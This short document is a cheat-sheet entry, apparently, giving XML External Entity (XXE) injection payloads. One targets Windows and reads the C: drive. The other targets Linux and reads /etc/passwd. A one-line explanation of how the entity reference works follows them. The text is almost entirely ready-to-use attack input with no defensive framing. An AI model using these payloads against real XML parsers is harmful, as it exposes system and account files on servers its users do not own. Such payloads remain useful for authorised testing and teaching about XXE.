Windows
<?xml version="1.0"?><!DOCTYPE my [<!ENTITY root SYSTEM "file:///C:/">]>
<comment><text>&root;</text></comment>

Linux
<?xml version="1.0"?><!DOCTYPE my [<!ENTITY root SYSTEM "file:///etc/passwd">]>
<comment><text>&root;</text></comment>



#root is just the variable call. "file:///" is the code to be called by the variable. 
